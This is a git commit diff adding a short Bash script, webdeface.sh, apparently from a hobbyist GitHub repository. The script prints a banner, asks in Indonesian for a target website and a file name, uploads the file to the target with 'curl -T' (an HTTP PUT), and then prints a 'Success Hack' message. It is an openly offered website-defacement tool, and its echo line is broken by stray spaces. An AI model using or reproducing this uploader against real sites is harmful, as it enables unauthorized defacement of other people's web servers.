a8c1b4ad673f9ee7fa6af589f410e5d387b6e9fc
TukangIseng1 <49801821+TukangIseng1@users.noreply.github.com>
2019-04-20 10:37:20 +0700

    Update webdeface.sh

--- webdeface.sh
+++ webdeface.sh
@@ -1,1 +1,7 @@
-
+clear
+cowsay -f eyes 'Mr.P3N1S' | lolcat
+figlet -f slant "Mr.P3N1S" | lolcat
+read -p "Masukan Web Target =>" target;
+read -p "Masukan Nama Script =>" script;
+curl -T /sdcard$script $target
+echo  "[!] Success Hack =>"  $ target / $ script
